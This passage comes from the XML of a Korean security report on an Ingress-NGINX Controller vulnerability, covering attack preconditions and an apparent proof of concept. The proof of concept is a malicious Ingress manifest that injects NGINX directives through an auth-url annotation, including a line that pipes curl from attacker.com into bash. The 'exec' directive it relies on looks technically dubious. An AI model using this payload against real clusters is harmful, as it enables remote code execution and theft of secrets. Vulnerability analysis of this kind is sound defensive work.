          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller가 설치된 모든 Kubernetes 클러스터</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5CD2D9" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기본 설정에서는 컨트롤러가 클러스터 전체 Secrets에 접근 가능하므로, 단일 취약점 악용만으로도 전체 클러스터 장악이 가능함</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47118514" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개된 인터넷에 노출된 약 6,500여 개 클러스터 포함, 전체 클라우드 환경의 약 43%에 영향</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B12F531" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRDefault="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F89E242" w14:textId="602F8FBC" w:rsidR="00E27F85" w:rsidRPr="001D6E9D" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격 시나리오 및 POC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6E0A02" w14:textId="186CED38" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="001D6E9D" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">5.1 </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격 전제 조건</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AA362C" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권한 요구사항</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10ECFB72" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress 객체 생성/수정 권한</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 공격자는 Kubernetes API 서버에 Ingress 리소스를 생성하거나 수정할 수 있는 권한이 필요합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E770680" w14:textId="402AA71A" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기본 설정에서는 edit 또는 admin 역할이 할당된 사용자만 가능하지만, RBAC 미스컨피그레이션 시 낮은 권한 계정도 가능</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67413E48" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크 접근성</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: Admission Controller가 외부에 노출된 경우(기본값: ClusterIP), 공격자는 다음 중 하나의 조건 충족 필요:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0FB94B" w14:textId="52441756" w:rsidR="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터 내 Pod 실행 권한(Internal Network Attack)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743A2A76" w14:textId="69200293" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Admission Webhook이 공개 인터넷에 노출된 경우(External Attack) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767BE2AE" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경 구성</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B42A1F" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="76"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향받는 Ingress-NGINX 버전(v1.11.4 이하, v1.12.0) 설치</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC092F1" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="76"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기본 설정에서 Admission Controller 활성화 상태(--enable-admission=true)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7285984B" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F6CF613" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5413E308" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="169E8CC6" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="094D211E" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D365616" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F7E53B8" w14:textId="77777777" w:rsidR="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="575A8B8D" w14:textId="08917691" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="001D6E9D" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">5.2 </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>악성</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>리소스</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F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F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0F1306" w14:textId="1ED4A9E4" w:rsidR="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F86513D" wp14:editId="30C35044">
                <wp:extent cx="5324475" cy="6762307"/>
                <wp:effectExtent l="0" t="0" r="28575" b="19685"/>
                <wp:docPr id="200654326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6762307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4EA15" w14:textId="56DABE9A" w:rsidR="0071623C" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="60B51ADE" w14:textId="08830263" w:rsidR="0071623C" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: networking.k8s.io/v1</w:t>
                            </w:r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kind: Ingress</w:t>
                            </w:r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metadata:</w:t>
                            </w:r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 name: malicious-ingress</w:t>
                            </w:r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 annotations:</w:t>
                            </w:r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   nginx.ingress.kubernetes.io/auth-url: |</w:t>
                            </w:r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     http://legit.com/;#</w:t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  <w:t xml:space="preserve">      \n    </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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proxy_pass</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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http://attacker.com;</w:t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  <w:t xml:space="preserve">      \n    access_log /var/log/nginx/secret.log;</w:t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  <w:t xml:space="preserve">      \n    exec /bin/sh -c 'curl http://attacker.com/exploit.sh | bash';</w:t>
                            </w:r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spec:</w:t>
                            </w:r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 </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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ingressClassName</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: nginx</w:t>
                            </w:r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 rules:</w:t>
                            </w:r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 - host: vulnerable-app.com</w:t>
                            </w:r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   http:</w:t>
                            </w:r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     paths:</w:t>
                            </w:r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     - path: /</w:t>
                            </w:r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       </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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pathType</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: Prefix</w:t>
                            </w:r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       backend:</w:t>
                            </w:r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         service:</w:t>
                            </w:r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           name: web-service</w:t>
                            </w:r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           port:</w:t>
                            </w:r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             number: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86513D" id="_x0000_s1029" style="width:419.25pt;height:53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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5BA4EA15" w14:textId="56DABE9A" w:rsidR="0071623C" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="60B51ADE" w14:textId="08830263" w:rsidR="0071623C" w:rsidRPr="001D6E9D" w:rsidRDefault="0071623C" w:rsidP="0071623C">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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>apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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>: networking.k8s.io/v1</w:t>
                      </w:r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>kind: Ingress</w:t>
                      </w:r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>metadata:</w:t>
                      </w:r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 name: malicious-ingress</w:t>
                      </w:r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 annotations:</w:t>
                      </w:r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   nginx.ingress.kubernetes.io/auth-url: |</w:t>
                      </w:r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     http://legit.com/;#</w:t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  <w:t xml:space="preserve">      \n    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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>proxy_pass</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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http://attacker.com;</w:t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  <w:t xml:space="preserve">      \n    access_log /var/log/nginx/secret.log;</w:t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  <w:t xml:space="preserve">      \n    exec /bin/sh -c 'curl http://attacker.com/exploit.sh | bash';</w:t>
                      </w:r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>spec:</w:t>
                      </w:r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 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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>ingressClassName</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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>: nginx</w:t>
                      </w:r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 rules:</w:t>
                      </w:r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 - host: vulnerable-app.com</w:t>
                      </w:r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   http:</w:t>
                      </w:r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     paths:</w:t>
                      </w:r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     - path: /</w:t>
                      </w:r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       </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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>pathType</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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>: Prefix</w:t>
                      </w:r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       backend:</w:t>
                      </w:r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         service:</w:t>
                      </w:r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           name: web-service</w:t>
                      </w:r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           port:</w:t>
                      </w:r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             number: 80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D01A2C0" w14:textId="77777777" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주요 악성 요소 분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CD55C7" w14:textId="4ABB261B" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>auth-url 주입:</w:t>
      </w:r>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> ;와 \n을 이용해 NGINX directive 분리</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A606558" w14:textId="25E3A65B" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="0071623C">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>명령 실행: </w:t>
      </w:r>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>exec 디렉티브로 bash 스크립트 실행</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1417E974" w14:textId="3F8509FC" w:rsidR="0071623C" w:rsidRPr="0071623C" w:rsidRDefault="0071623C" w:rsidP="001D6E9D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그 유출: </w:t>
      </w:r>
      <w:r w:rsidRPr="0071623C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>access_log로 Secrets 접근 기록 저장</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3756881F" w14:textId="3219113D" w:rsidR="001D6E9D" w:rsidRPr="0071623C" w:rsidRDefault="001D6E9D" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">5.3 </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
